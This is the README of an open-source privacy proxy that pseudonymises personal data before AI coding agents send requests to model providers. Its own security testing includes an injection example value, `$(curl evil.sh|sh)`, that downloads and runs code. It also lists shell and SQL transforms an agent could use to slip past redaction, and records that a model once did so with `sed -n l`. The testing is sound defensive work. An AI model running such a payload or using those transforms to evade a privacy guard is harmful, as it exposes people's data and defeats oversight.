# veil

[![PyPI](https://img.shields.io/pypi/v/veil-proxy)](https://pypi.org/project/veil-proxy/)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue)](LICENSE)
[![CI](https://github.com/lemonadesaltbagel/veil/actions/workflows/ci.yml/badge.svg)](https://github.com/lemonadesaltbagel/veil/actions/workflows/ci.yml)
![Python](https://img.shields.io/badge/python-3.11%2B-blue)
![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey)
![Status](https://img.shields.io/badge/status-alpha-orange)

**Your AI coding agent reads production-shaped data. veil makes sure the model never sees a real
person.**

veil is a local privacy proxy for AI coding agents such as Claude Code, Codex CLI and Aider. It
replaces every real name, email, phone number, address, ID number and secret with a consistent
pseudonym *before* the request leaves your machine. When the agent runs a command, queries a
database or edits a file locally, veil swaps the real values back in, safely escaped. The model
reasons about real bugs; it just never learns who they happened to.

### From a real session

This is the same log line, captured during a real Claude Code session against a live model (DeepSeek)
through veil:

```text
what was on disk   WARN billing.charge duplicate invoice=293 amount=0.99 customer="Leonie Köhler"
                   email=leonekohler@surfeu.de card=4111 1111 1111 1111 ship_to="Theodor-Heuss-Straße 34" ip=84.191.20.7

what the model got WARN billing.charge duplicate invoice=293 amount=0.99 customer="First_Cfbf Last_Cfbf"
                   email=user_cfbf@example.test card=card_3kvd ship_to="Cfbf Example Street" ip=192.0.2.28
```

The model still found the bug (invoice 293 was charged twice within the same second). Its answer
came back to the developer with the real name, card number and address restored. The provider saw
none of them.

## Contents

[Install](#install) · [Quick start](#quick-start-claude-code) · [Using veil day to day](#using-veil-day-to-day) ·
[Database tool for the agent](#database-tool-for-the-agent) · [Data sources](#data-sources) ·
[Supported clients](#supported-clients) · [Teams](#teams) · [Why veil is built for privacy](#why-veil-is-built-for-privacy) ·
[How it works](#how-it-works) · [Prove it yourself](#prove-it-yourself) · [Limitations](#limitations) ·
[Release history](#release-history)

## Install

veil is published on **PyPI** as [`veil-proxy`](https://pypi.org/project/veil-proxy/). It installs
the `veil` and `veil-hook` commands, on macOS, Linux and Windows.

```sh
pip install veil-proxy                 # core: httpx, cryptography, pyahocorasick
pip install "veil-proxy[postgres]"     # extras: postgres, mysql, mongo, redis, bedrock, ner, mssql, snowflake, all
```

Or with Homebrew (macOS/Linux):

```sh
brew install lemonadesaltbagel/veil/veil
brew services start veil               # optional: keep the proxy running on 127.0.0.1:8787
```

Or from source (requires [uv](https://docs.astral.sh/uv/)):

```sh
git clone https://github.com/lemonadesaltbagel/veil.git && cd veil/prototype
uv sync
uv run veil --help
```

Keys are kept in the OS keychain: macOS Keychain, Linux Secret Service, or Windows Credential
Manager. CI or containers can use `VEIL_VAULT_KEY` / `VEIL_TOKEN_SECRET` instead.

## Quick start (Claude Code)

```sh
veil init ~/code/myapp --mcp   # find and seed the project's data; point Claude Code at veil; add the database tool
veil service install           # run the proxy in the background, started at login
veil status ~/code/myapp       # proxy, service, keys, vault, project wiring
cd ~/code/myapp && claude      # nothing else to configure
```

`veil init` does the following:

- **Finds the project's data:**
  - database URLs in `.env*` files (`DATABASE_URL`, `REDIS_URL`, `MONGODB_URI`, …);
  - SQLite files and fixture folders;
  - the git history (contributors);
  - personal fields declared in code (Prisma, Django, Rails, SQLAlchemy, OpenAPI, protobuf).
- **Seeds veil with the real values**, and remembers the sources (encrypted) so it re-seeds them when
  the data changes.
- **Writes `.claude/settings.local.json`** (git-ignored), with the proxy address and backup hooks.
- **With `--mcp`:** registers the [database tool](#database-tool-for-the-agent) with Claude Code. It
  refers to the source by number, so no credentials appear in any config.

The proxy must be running, or Claude Code can't connect. `veil service install` sets it up as a
LaunchAgent on macOS, a systemd user unit on Linux, or a Startup-folder launcher on Windows (no admin
rights needed). `veil proxy` runs it in the foreground.

## Using veil day to day

You keep working as before. The model sees pseudonyms; **you** see real values, unless you choose
otherwise:

```sh
veil display tokens            # screen sharing or a demo: answers keep pseudonyms (no restart)
veil display real              # back to real values (the default)
veil share bug-report.txt      # real values -> pseudonyms, before you paste text anywhere
veil reveal notes.txt          # pseudonyms -> real values, locally
```

More data, privacy settings and keys:

```sh
veil seed postgresql://user@localhost/app ./fixtures git:.   # add sources (see Data sources)
veil seed --schema ~/code/myapp      # learn personal fields declared in code
veil sources                         # list remembered sources (credentials masked); `veil sources remove N`
veil quasi warn | redact | off       # rare cities, postal codes, birth dates, employers, and rare combinations
veil keys rotate                     # new vault key: everything re-encrypted, pseudonyms unchanged
veil keys rotate --token-secret      # new pseudonyms; old ones still restore in open conversations
veil proxy --capture DIR             # write every request exactly as it left your machine
VEIL_HOME=~/.veil-acme veil init ~/code/acme --port 8788   # a separate vault and proxy per project
```

Free text about third parties (support tickets, notes) can use an optional NER model:
`pip install "veil-proxy[ner]"`, then `veil ner-model fetch`.

## Database tool for the agent

`veil mcp-db` is a **read-only database tool**, served to the agent over MCP. Claude Code lists it as
`veil-db`. The agent queries with pseudonyms; veil turns each pseudonym inside a string literal into
a **bound parameter** carrying the real value, so real values are never SQL text and nothing needs
escaping. Results come back pseudonymised.

| Database | Tools |
|---|---|
| SQLite, Postgres, MySQL/MariaDB, SQL Server | `query` (one read-only statement; default 100 rows, max 500), `list_tables`, `describe_table` |
| MongoDB | `collections`, `find`, `aggregate`, `count` |

```sql
-- what the agent writes                         -- what runs against your database
SELECT * FROM customer                           SELECT * FROM customer
WHERE email = 'user_ab12@example.test'           WHERE email = ?        -- ? = the real email
```

- **Refused:**
  - pseudonyms outside a string literal;
  - literals holding only part of a pseudonym;
  - more than one statement, or any write (data-modifying CTEs, `SELECT … INTO`, `FOR UPDATE`,
    setting-changing PRAGMAs);
  - MongoDB `$out`, `$merge`, `$where` and `$function`.
- **Read-only underneath as well:** SQLite opens read-only, Postgres and MySQL use read-only sessions,
  and SQL Server rolls back after each query. Queries time out after 30 s (SQL Server: the server's
  own limits).
- **Setup:** `veil init --mcp` registers it, one server per database. By hand:
  `claude mcp add veil-db --scope local -- veil mcp-db --source N`, with N from `veil sources`.

## Data sources

veil learns the real values from your own data, then finds them anywhere: logs, JSON, stack traces,
query output, free text.

| Source | Examples | What veil uses |
|---|---|---|
| Postgres | `postgresql://user@host/app` | column comments, pg_anonymizer labels, JSONB paths, foreign keys |
| MySQL / MariaDB | `mysql://root@host/app` | comments, JSON columns, foreign keys |
| SQL Server | `mssql://user:pw@host/app` (`[mssql]`) | **sensitivity classifications**, dynamic data masks, `MS_Description` |
| SQLite | `app.db` | table info, foreign keys |
| MongoDB | `mongodb://host/app` | sampled documents, nested paths, JWT payloads |
| Redis | `redis://host:6379/0` | key patterns, hashes, JSON values |
| Elasticsearch / OpenSearch | `elasticsearch://host:9200` | mappings, field `meta`, events grouped by customer |
| DynamoDB | `dynamodb://us-east-1` | key segments such as `PK = USER#email` |
| Snowflake | `snowflake://user:pw@acct/DB` (`[snowflake]`) | `SEMANTIC_CATEGORY` / `PRIVACY_CATEGORY` tags |
| BigQuery | `bigquery://project` | policy tags, nested fields |
| Fixture files | `./fixtures` | JSON, JSONL, CSV, Django fixtures, mongoexport |
| git history | `git:.` | authors and co-authors (bots skipped) |
| Your code | `veil seed --schema DIR` | Prisma, Django, Rails, SQLAlchemy, OpenAPI, protobuf annotations |

Fields are classified from native labels first, then column and path names, then sampled values. One
person keeps one pseudonym across tables and stores. While the proxy runs, changed sources are
re-seeded in the background, reading only new rows where the source allows it. Details:
[docs/DATABASES.md](docs/DATABASES.md).

## Supported clients

One proxy serves all of them, routed by path:

| Client | API | Point it at veil |
|---|---|---|
| Claude Code, Claude Agent SDK | Anthropic Messages | `veil init` (or `ANTHROPIC_BASE_URL=http://127.0.0.1:8787`) |
| Claude Code on Amazon Bedrock | Bedrock InvokeModel (binary event stream) | `CLAUDE_CODE_USE_BEDROCK=1`, `ANTHROPIC_BEDROCK_BASE_URL=http://127.0.0.1:8787`, `CLAUDE_CODE_SKIP_BEDROCK_AUTH=1` |
| Claude Code on Google Vertex | Vertex rawPredict | `CLAUDE_CODE_USE_VERTEX=1`, `ANTHROPIC_VERTEX_BASE_URL=http://127.0.0.1:8787/v1`, `CLAUDE_CODE_SKIP_VERTEX_AUTH=1` |
| Claude Code on Microsoft Foundry | Anthropic Messages | `CLAUDE_CODE_USE_FOUNDRY=1`, `ANTHROPIC_FOUNDRY_BASE_URL=http://127.0.0.1:8787/foundry` (proxy: `--foundry-upstream https://RESOURCE.services.ai.azure.com/anthropic`) |
| Claude Code on Claude Platform on AWS | Anthropic Messages | `CLAUDE_CODE_USE_ANTHROPIC_AWS=1`, `ANTHROPIC_AWS_BASE_URL=http://127.0.0.1:8787/anthropic-aws`, `ANTHROPIC_AWS_WORKSPACE_ID=…` (proxy: `--anthropic-aws-upstream https://aws-external-anthropic.REGION.api.aws`) |
| DeepSeek Harness (`dsh`) | Anthropic Messages | `DEEPSEEK_BASE_URL=http://127.0.0.1:8787` (proxy: `--upstream https://api.deepseek.com/anthropic`) |
| Codex CLI | OpenAI Responses | provider with `base_url = "http://127.0.0.1:8787/v1"`, `wire_api = "responses"` |
| Aider, Continue, OpenAI SDK, LiteLLM | OpenAI Chat Completions | `OPENAI_BASE_URL=http://127.0.0.1:8787/v1` |

Cloud credentials:

- **Bedrock and Vertex:** the client skips its own auth, and veil signs requests *after* redacting
  them. Bedrock uses `AWS_BEARER_TOKEN_BEDROCK` or SigV4 (`veil-proxy[bedrock]`); Vertex uses
  `gcloud` or `VEIL_VERTEX_TOKEN`.
- **Microsoft Foundry:** API keys and Entra tokens don't cover the body, so the client's own
  credentials pass through. With `CLAUDE_CODE_SKIP_FOUNDRY_AUTH=1`, veil adds
  `ANTHROPIC_FOUNDRY_API_KEY` or an `az` token.
- **Claude Platform on AWS:** a workspace API key passes through. For SigV4, set
  `CLAUDE_CODE_SKIP_ANTHROPIC_AWS_AUTH=1` and veil signs after redaction. The SigV4 service name is
  taken from the host and isn't documented; override it with `VEIL_ANTHROPIC_AWS_SIGV4_SERVICE` if
  needed.

Every row has been exercised end to end with a real client (Claude Code 2.1.285, DeepSeek Harness
0.2.1-rc.2, Codex CLI, or the OpenAI SDK) through veil against a faithful fake upstream, with 0 leaks.
DeepSeek Harness was also run against the real DeepSeek API: 9 requests, 0 leaks, and the correct
diagnosis. None of the cloud rows has been run against a live cloud account yet.

DeepSeek Harness tools (`bash`, `read`, `grep`, `glob`, `edit`, `write`, `str_replace_editor`,
`working_directory`) get the same restore rules as Claude Code's, because they share argument
names. Its other tools (`run_code`, `workflow`, `pwsh`, `subagent`, `web_*`, terminals) never receive
real values.

## Teams

```sh
veil team export --to aws-sm://veil/team     # the lead: publish the pseudonym secret (op://, gcp-sm://, vault://, file:)
veil team join --from aws-sm://veil/team     # everyone: identical pseudonyms on every machine
veil team sync                               # follow a rotation; old pseudonyms keep working
veil team allow support@mycompany.com        # values that are never PII
veil team managed-settings --port 8787       # admin policy: Claude Code must go through veil
veil team managed-settings --display tokens  # ...and pseudonyms stay on every screen
```

Teams share only the pseudonym secret, never the vault key. Without a secrets manager,
`veil team export --passphrase-env VAR` prints a passphrase-protected bundle instead. The
managed-settings file pins the proxy address and sets `allowedProviders: ["customEndpoint"]`, so
Claude Code accepts only that exact endpoint. An admin installs it into
`/Library/Application Support/ClaudeCode/managed-settings.d/` (macOS) or
`/etc/claude-code/managed-settings.d/` (Linux).

## Why veil is built for privacy

Every number below comes from our own test runs. The harness that produced them is in this repo and
can be re-run: see [Prove it yourself](#prove-it-yourself).

**1. It knows your data instead of guessing.** Most redaction tools look for things that *look* like
PII. veil first learns the actual values from your own [data sources](#data-sources), then finds
them anywhere. On 1,000 labelled free-text records (ai4privacy):

| Approach | Names and contact details that got through |
|---|---|
| Pattern matching (what regex-based gateways do) | **80.4%** |
| Patterns + a dedicated PII NER model | 17.6% |
| **veil seeded from your data** | **1.8%** |

**2. Tested against real agents and real models, not just unit tests.** Four complete agent sessions
ran against a live model (DeepSeek), totalling 39 model requests, across Claude Code, the Anthropic
SDK and the OpenAI SDK. Every payload was checked against 463 real values with a scanner that also
decodes escapes, encodings and transforms. Result: **0 real values reached the provider**, and every
session still reached the correct diagnosis. Later real-model runs added 32 more requests, including
two coding tasks on a real repository: still 0 leaks.

**3. Attacked like an adversary would.** An agent with a shell can transform data before veil sees
it. We built a bypass matrix of 21 one-command transforms: byte dumps (`od`, `xxd`, `sed -n l`),
`base64`, escape sequences, `rev`, rot13, upper-casing, one-character-per-line, spaced-out letters,
truncation with `cut` (including byte cuts that split a character), and SQL `hex()`, `upper()`,
`replace()`, `substr()`, `unicode()`.
**21 of 21 are contained**: blocked before they run, withheld, or fully redacted. The matrix is part
of the regression suite. Two lessons came out of this work:

- A real model *did* bypass an early version by printing a log with `sed -n l` (octal escapes plus
  line wrapping). Our audit caught it, and that class of bypass is now closed and regression-tested.
- Our first leak checker reported 15/20; once it was taught to decode every transform, the truth was
  9/20. We fixed the checker before fixing veil. veil's numbers come from an oracle that is harder
  on veil than veil is on attackers.

**4. Real values can't become code.** Putting a real value back into a shell command turns data into
code: a customer named `$(curl evil.sh|sh)`, or just `O'Brien`. veil escapes every restored value for
each language layer it passes through:

- shell quoting, heredocs and `$( )`;
- code passed to `python -c` (including f-strings), `node -e`, `ruby`, `perl`, `php`, `jq`, `awk`,
  SQL clients, and `bash -c` / `eval`, recursively.

Where a value's output would itself become code (`… | sh`, `v=…; python3 -c "$v"`), only inert values
are restored. Of 35 shell/SQL injection tests, **23 fail without this protection and all 35 pass with
it**. A fuzzer has executed **68,000** randomly nested commands with hostile values: **0 ran any
code**. For database access, the [database tool](#database-tool-for-the-agent) avoids escaping
altogether: real values travel as bound parameters.

**5. It never writes new PII into your code.** Edit and write tools only get back values that already
exist in the target file, and each one is escaped for where it lands: a Python f-string, a JS
template literal, a JSON or YAML value, a CSV field, a shell script. Web tools, unknown tools and
network-capable commands (`curl`, `ssh`, `git push`) never receive real values, which shuts the door
on prompt-injected exfiltration.

**6. It fails closed.** If redaction errors, the request is refused (HTTP 502); raw data is never
forwarded as a fallback. A second, independent guard scans the exact outgoing bytes (plain, encoded,
transformed and truncated values) and repairs or withholds anything the first pass missed. Testing
with real Claude Code traffic surfaced two protocol corners. An undocumented `safeguards` request field
carried your home directory; veil now redacts every field it doesn't positively know to be
configuration. A tool schema with a property literally named `type` crashed redaction; veil refused
the request rather than leak it.

**7. Privacy that doesn't cost you the model.** Pseudonyms are deterministic, so the conversation
prefix stays byte-stable and **prompt caching keeps working: 74–89% cache hits** in the real runs.
At about 40,000 seeded values veil adds **≈ 8 ms of redaction + 11 ms of guard** per
67,000-character Claude Code request, and hooks answer in **≈ 39 ms**. It scales: with **1.2 million
seeded values** (150,000 people) a 234 KB request takes 37 + 68 ms, in 1.1 GB of memory
([docs/SCALE.md](docs/SCALE.md)).

**8. Your secrets stay yours, even at rest.** The local vault is AES-256-GCM encrypted, with each
value bound to its pseudonym. Keys live in the OS keychain and can be rotated without changing a
single pseudonym. Teams share pseudonyms (the HMAC secret) through a secrets manager, never the
vault key.

**9. It keeps up with your data.** veil remembers the sources you seeded and watches cheap change
signals: database write counters and table statistics, MongoDB op counters, file times. A customer
added while you work is pseudonymised on the next request. Re-seeding reads only new rows where the
source allows it and grows the existing indexes: at 1.2M values, a change costs about 0.7 s, in the
background.

**10. It knows what else identifies people.** Birth dates, postal codes, cities, companies and job
titles of your seeded people are tracked with how many records share them. Rare ones reaching the
model are reported (kinds and counts only), or pseudonymised with `veil quasi redact`. The same
goes for rare *combinations* of common values: a city and a job title that only one person shares.
SSNs, IBANs (checksum-validated), passports and tax IDs are always pseudonymised.

**11. Proven on a real repository.** Setup: veil's own repository, 39,650 seeded values, Claude Code
with a live model through veil. Task: add a feature and run the tests. The task succeeded, 0 real
values leaked, 0 pseudonyms ended up in the code, and the only replacements were the developer's
username and git name, so there were no false positives (`veil_dev.pilot`).

### How it compares

| | Regex/NER redaction gateways | DLP blockers | Masked database copies | Hook-only redactors | **veil** |
|---|---|---|---|---|---|
| Learns the real values from your data | ✗ | ✗ | ✓ (DB only) | ✗ | **✓** |
| Covers logs, fixtures, free text, paths | partly | ✓ (blocks) | ✗ | partly | **✓** |
| Agent can still run real queries | ✓ | ✗ | ✗ | partly | **✓** |
| One stable pseudonym per person (caching, reasoning) | often ✗ ¹ | n/a | ✓ | varies | **✓** |
| Fails closed | varies | ✓ | ✓ | ✗ ² | **✓** |

¹ For example, LiteLLM's Presidio guardrail (v1.107, by our code review) numbers tokens by position
within each message, so the same person gets different tokens across messages.
² Claude Code ignores a hook's rewritten output if its shape is wrong and sends the original instead.

Background research, with sources: [docs/RESEARCH.md](docs/RESEARCH.md).

## How it works

```text
 coding agent ──► veil (127.0.0.1:8787) ──► model provider
   (real data)    redact ▸ guard ▸ forward      (pseudonyms only)
              ◄── rehydrate per tool policy ◄──
```

- **Seeding:** classifies fields from native PII labels, column and JSON-path names, and value
  sampling. It groups one person across tables, collections and stores by unique foreign keys and
  shared emails or usernames.
- **Pseudonyms:** deterministic HMAC codes, one per person: `user_ab12`, `user_ab12+2@example.test`,
  `First_Ab12 Last_Ab12`, `Ab12 Example Street`. Phone numbers and IPs come from fictional ranges.
- **Tool policy:** shell, read and grep tools get real values back, escaped for their context. Edit
  and write tools only get values that already exist in the file. The database tool binds them as
  parameters. Everything else gets none.
- **Guard:** an independent final check that repairs or withholds what redaction missed.
- **Optional NER:** a 46 MB ONNX model for third parties in free text (`veil-proxy[ner]`).

Architecture, token scheme and threat model: [docs/DESIGN.md](docs/DESIGN.md).

## Prove it yourself

Don't take our word for it.

- **See what your model sees.** `veil proxy --capture DIR` writes every request exactly as it left
  your machine.
- **Re-run our evidence** from a checkout:

```sh
cd prototype
uv run pytest -q                          # unit + integration tests (DB tests skip when DBs are down)
scripts/fetch_datasets.sh                 # public sample data (Chinook, MongoDB mflix, Redis users, ai4privacy)
scripts/dev_dbs.sh start                  # local Postgres, MariaDB, Redis, MongoDB (Homebrew; Docker fallback for Postgres)
uv run veil audit                         # real Claude Code -> veil -> scripted model; reports what the model saw
uv run veil audit --driver codex          # real Codex CLI (also: --driver openai|sdk)
uv run veil audit --provider foundry      # also: bedrock | vertex | anthropic-aws
uv run veil audit --driver dsh            # real DeepSeek Harness (npm i -g @deepseek-ai/dsh)
uv run veil audit --upstream https://api.deepseek.com/anthropic --api-key-env DEEPSEEK_API_KEY --model deepseek-flash
uv run python -m veil_dev.redteam         # the 21-technique bypass matrix
uv run python -m veil_dev.shellfuzz --cases 10000   # executes fuzzed commands; any code execution fails
uv run python -m veil_dev.mcp_e2e         # real Claude Code + veil mcp-db: queried by pseudonym, 0 leaks
uv run python -m veil_dev.scale           # a million seeded values: build time, memory, latency
uv run python -m veil_dev.pilot --repo ~/code/myapp --task "..." --seed ... --upstream ... --out DIR
uv run python scripts/eval_ai4privacy.py  # free-text leak rates: patterns / +NER / seeded
```

Each audit writes a report with three files per request: what your client sent, what the model
received, and what the model replied. CI runs the test suite on macOS, Linux and Windows, and
against live Postgres, MariaDB, Redis, MongoDB, SQL Server, Elasticsearch and DynamoDB Local.

## Limitations

veil is alpha software. We'd rather you know exactly where its edges are:

- **Your machine is trusted.** The vault, the agent's local transcripts (which show real values) and
  local telemetry all hold real data.
- **Unanticipated transforms.** An agent with a shell can invent transforms we haven't anticipated.
  The bypass matrix is evidence, not proof.
- **Fragment searches.** A search on *part* of a pseudonym (`LIKE '%ab12%'`) can't match real data.
  veil explains this to the model instead of running the command.
- **Short values.** Seeded values shorter than 8 characters are matched verbatim or encoded only.
  Standalone first or last names that are common words (`Mark`, `Code`) aren't seeded on their own;
  the full name still is.
- **Free text about third parties** needs the optional NER model (`veil-proxy[ner]`, then
  `veil ner-model fetch`).
- **Re-identification.** Rare quasi-identifiers, and rare combinations of them on one line, are
  reported or pseudonymised. Combinations spread over several lines aren't, nor are exact amounts and
  timestamps; those identify someone only together with your database, which stays local.
- **Code in unknown languages.** Values are escaped for sh, heredocs, the common interpreters and the
  common file types. Anything else gets the value as is; prefer `veil mcp-db` for database access.
- **Cloud providers.** Bedrock, Vertex, Microsoft Foundry and Claude Platform on AWS are verified with
  the real Claude Code CLI against faithful fake upstreams, not yet against live cloud accounts.
- **Images** (screenshots) are passed through unscanned.

## Release history

| Version | Date | Where | Notes |
|---|---|---|---|
| main | unreleased | this repository | DeepSeek Harness support (tool policy, `veil audit --driver dsh`, CI); a fragment of a phone pseudonym is no longer re-pseudonymised. |
| 0.3.0 | 2026-10-21 | [PyPI](https://pypi.org/project/veil-proxy/0.3.0/), [TestPyPI](https://test.pypi.org/project/veil-proxy/0.3.0/), [Homebrew tap](https://github.com/lemonadesaltbagel/homebrew-veil) | First release under the **Apache-2.0** license. Database tool for the agent (`veil mcp-db`, bound parameters), values escaped for the file they're written into, rare combinations of quasi-identifiers, git/DynamoDB/Snowflake/BigQuery sources, live SQL Server/Elasticsearch/DynamoDB in CI, delta re-seeding and grown indexes, team secrets via secrets managers. |
| 0.2.1 | 2026-10-21 | [PyPI](https://pypi.org/project/veil-proxy/0.2.1/), [TestPyPI](https://test.pypi.org/project/veil-proxy/0.2.1/), [Homebrew tap](https://github.com/lemonadesaltbagel/homebrew-veil) | Bug fix: the proxy's local HTTP server no longer does a reverse-DNS lookup of 127.0.0.1 when it starts. On some Macs (mDNS) that lookup stalls for 30 s or more, delaying `veil proxy` startup; it also caused intermittent CI hangs. |
| 0.2.0 | 2026-10-21 | [PyPI](https://pypi.org/project/veil-proxy/0.2.0/), [TestPyPI](https://test.pypi.org/project/veil-proxy/0.2.0/), [Homebrew tap](https://github.com/lemonadesaltbagel/homebrew-veil) | Display modes (`veil display`, `reveal`, `share`, team-enforced pseudonyms), automatic re-seeding, scale to 1M+ seeded values, escaping for embedded languages (fuzzed), quasi-identifiers and direct identifiers, key rotation, per-project vaults, byte-cut truncation, CI with live databases. |
| 0.1.2 | 2026-10-21 | [PyPI](https://pypi.org/project/veil-proxy/0.1.2/), [TestPyPI](https://test.pypi.org/project/veil-proxy/0.1.2/), [Homebrew tap](https://github.com/lemonadesaltbagel/homebrew-veil) | Same code as 0.1.1, built with a pure-Python backend (`flit_core`) so the source archive builds without a Rust toolchain; that is what Homebrew needs. The dev harness moved out of the package into `veil_dev/`. Verified with `brew install --build-from-source`, `brew test` and `brew audit --strict`. |
| 0.1.1 | 2026-10-21 | [PyPI](https://pypi.org/project/veil-proxy/0.1.1/), [TestPyPI](https://test.pypi.org/project/veil-proxy/0.1.1/) | First PyPI release. The same files went to TestPyPI first as a final dry run, then to PyPI; both were verified byte-identical to the inspected build. |
| 0.1.0 | 2026-10-20 | [TestPyPI](https://test.pypi.org/project/veil-proxy/0.1.0/) only | Packaging dry run: verified the runtime-only contents, a clean install from the index, and the console scripts. Never published to PyPI. |

Every release ships only the runtime package (`veil/`). Tests, scripts, datasets and the audit
harness (`veil_dev/`) stay in this repository.

## Repository layout

```text
docs/RESEARCH.md     landscape, interception points, findings from every test round
docs/DESIGN.md       architecture, token scheme, tool policy, guard, adapters, threat model
docs/DATABASES.md    seeding: implemented sources, classification signals, other database families
docs/SCALE.md        a million seeded values: before/after measurements
prototype/veil/      the package (proxy, engine, guard, seeders, database tool, API adapters, CLI)
prototype/veil_dev/  development harness: audits, fake models, bypass matrix, fuzzer, pilot, scale (not packaged)
prototype/tests/     test suite
prototype/scripts/   dev databases, dataset fetch, evaluation, Homebrew formula generator
```

## Acknowledgements

The column-name dictionary in `veil/data/` is from
[PostgreSQL Anonymizer](https://gitlab.com/dalibo/postgresql_anonymizer) (PostgreSQL License). Test
data comes from the [Chinook database](https://github.com/lerocha/chinook-database), the
[MongoDB sample datasets](https://github.com/neelabalan/mongodb-sample-dataset),
[redis-datasets](https://github.com/redis-developer/redis-datasets) and
[ai4privacy](https://huggingface.co/datasets/ai4privacy/pii-masking-200k). These are downloaded by
`scripts/fetch_datasets.sh`, not redistributed.

## License

[Apache License 2.0](LICENSE). Vendored data keeps its own terms: the column-name dictionary in
`veil/data/` is under the PostgreSQL License, and the word list there is public domain (see
`veil/data/README.md`).
